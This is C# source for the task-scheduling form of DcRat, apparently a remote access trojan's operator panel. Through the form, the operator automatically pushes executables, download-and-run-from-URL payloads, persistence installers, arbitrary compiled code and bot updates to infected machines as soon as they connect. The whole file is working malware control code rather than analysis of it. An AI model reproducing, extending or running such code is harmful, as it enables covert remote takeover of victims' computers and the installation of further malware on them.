using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using DcRat.Properties;
using DcRat.TCPSocket;
using MessagePack;
using Microsoft.VisualBasic;

namespace DcRat.helpForms
{
    public partial class helperFormTask : Form
    {
        public helperFormTask()
        {
            InitializeComponent();
            SetTheme();
        }

        #region Theme

        private void SetTheme()
        {
            var darkTheme = Settings.Default.darkTheme;

            var colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            var colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            paneltop.BackColor = colorSide;
            labelDcRat.BackColor = colorSide;
            labelDcRat.ForeColor = colorText;
            buttonclose.BackColor = colorSide;

            buttonclose.Image = darkTheme ? Resources.close : Resources.close_dark;
            buttonok.ForeColor = colorText;
            buttonok.BackColor = colorSide;
        }

        #endregion

        #region Move
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hwnd, int wMsg, int wParam, int lParam);
        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_MOVE = 0xF010;
        public const int HTCAPTION = 0x0002;
        private void paneltop_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        private void labelDcRat_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        #endregion

        private void buttonok_Click(object sender, EventArgs e)
        {
            var pack = new MsgPack();
            if (radioButtonsendfile.Checked)
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Multiselect = false;
                    openFileDialog.Filter = "(*.exe)|*.exe";
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var source = Resources.Send_File_From_Disk
                            .Replace("%qwqdanchun%",
                                Convert.ToBase64String(File.ReadAllBytes(openFileDialog.FileName)))
                            .Replace("%Extension%", Path.GetExtension(openFileDialog.FileName));

                        pack.ForcePathObject("Packet").AsString = "codedom";
                        pack.ForcePathObject("Source").AsString = source;
                        pack.ForcePathObject("References").AsString = "System.dll";

                        MsgPack mypack = new MsgPack();
                        mypack.ForcePathObject("Packet").AsString = "Tasks";
                        mypack.ForcePathObject("Message").AsString = "Add";
                        mypack.ForcePathObject("Name").AsString = textBoxname.Text;
                        mypack.ForcePathObject("Trigger").AsString = radioButtonnewmachine.Checked ? "New_Machine" : "New_Connection";
                        mypack.ForcePathObject("msgpack").SetAsBytes(pack.Encode2Bytes());

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Type").AsString = "Controler";
                        msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                        msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(mypack.Encode2Bytes());
                        ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            else if (radioButtondownloadfile.Checked)
            {
                var Msgbox = Interaction.InputBox("Type in the URL of the file", "File URL",
                        "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe");

                var source = Resources.Send_File_From_URL.Replace("%qwqdanchun%", Msgbox);

                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("Source").AsString = source;
                pack.ForcePathObject("References").AsString = "System.dll";

                MsgPack mypack = new MsgPack();
                mypack.ForcePathObject("Packet").AsString = "Tasks";
                mypack.ForcePathObject("Message").AsString = "Add";
                mypack.ForcePathObject("Name").AsString = textBoxname.Text;
                mypack.ForcePathObject("Trigger").AsString = radioButtonnewmachine.Checked ? "New_Machine" : "New_Connection";
                mypack.ForcePathObject("msgpack").SetAsBytes(pack.Encode2Bytes());

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(mypack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
            else if (radioButtoninstall.Checked)
            {
                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("Source").AsString = Resources.Install;
                pack.ForcePathObject("References").AsString = "System.dll";

                MsgPack mypack = new MsgPack();
                mypack.ForcePathObject("Packet").AsString = "Tasks";
                mypack.ForcePathObject("Message").AsString = "Add";
                mypack.ForcePathObject("Name").AsString = textBoxname.Text;
                mypack.ForcePathObject("Trigger").AsString = radioButtonnewmachine.Checked ? "New_Machine" : "New_Connection";
                mypack.ForcePathObject("msgpack").SetAsBytes(pack.Encode2Bytes());

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(mypack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
            else if (radioButtoncodedom.Checked)
            {
                helperFormCodeDom formCodeDom = new helperFormCodeDom();
                formCodeDom.taskName = textBoxname.Text;
                formCodeDom.Trigger = radioButtonnewmachine.Checked ? "New_Machine" : "New_Connection";
                formCodeDom.Show();
            }
            else if (radioButtonupdate.Checked)
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Multiselect = false;
                    openFileDialog.Filter = "(*.bin)|*.bin";
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        pack.ForcePathObject("Packet").AsString = "option";
                        pack.ForcePathObject("Command").AsString = "Update";
                        pack.ForcePathObject("File").LoadFileAsBytes(openFileDialog.FileName);

                        MsgPack mypack = new MsgPack();
                        mypack.ForcePathObject("Packet").AsString = "Tasks";
                        mypack.ForcePathObject("Message").AsString = "Add";
                        mypack.ForcePathObject("Name").AsString = textBoxname.Text;
                        mypack.ForcePathObject("Trigger").AsString = radioButtonnewmachine.Checked ? "New_Machine" : "New_Connection";
                        mypack.ForcePathObject("msgpack").SetAsBytes(pack.Encode2Bytes());

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Type").AsString = "Controler";
                        msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                        msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(mypack.Encode2Bytes());
                        ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            else if (radioButtonmessagebox.Checked)
            {
                var Msgbox = Interaction.InputBox("Type in the message", "Message Box", "Hello World!");

                var source = Resources.Message_Box.Replace("%qwqdanchun%", Msgbox);
                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("Source").AsString = source;
                pack.ForcePathObject("References").AsString = "System.dll-=>System.Windows.Forms.dll";

                MsgPack mypack = new MsgPack();
                mypack.ForcePathObject("Packet").AsString = "Tasks";
                mypack.ForcePathObject("Message").AsString = "Add";
                mypack.ForcePathObject("Name").AsString = textBoxname.Text;
                mypack.ForcePathObject("Trigger").AsString = radioButtonnewmachine.Checked ? "New_Machine" : "New_Connection";
                mypack.ForcePathObject("msgpack").SetAsBytes(pack.Encode2Bytes());

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(mypack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
            else if (radioButtonopenwebsite.Checked)
            {
                var Msgbox = Interaction.InputBox("Type in the URL", "Visit Website",
                        "https://www.qwqdanchun.com/");

                var source = Resources.Visit_Website.Replace("%qwqdanchun%", Msgbox);
                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("Source").AsString = source;
                pack.ForcePathObject("References").AsString = "System.dll";

                MsgPack mypack = new MsgPack();
                mypack.ForcePathObject("Packet").AsString = "Tasks";
                mypack.ForcePathObject("Message").AsString = "Add";
                mypack.ForcePathObject("Name").AsString = textBoxname.Text;
                mypack.ForcePathObject("Trigger").AsString = radioButtonnewmachine.Checked ? "New_Machine" : "New_Connection";
                mypack.ForcePathObject("msgpack").SetAsBytes(pack.Encode2Bytes());

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(mypack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
            this.Close();
        }

        private void buttonclose_Click(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}
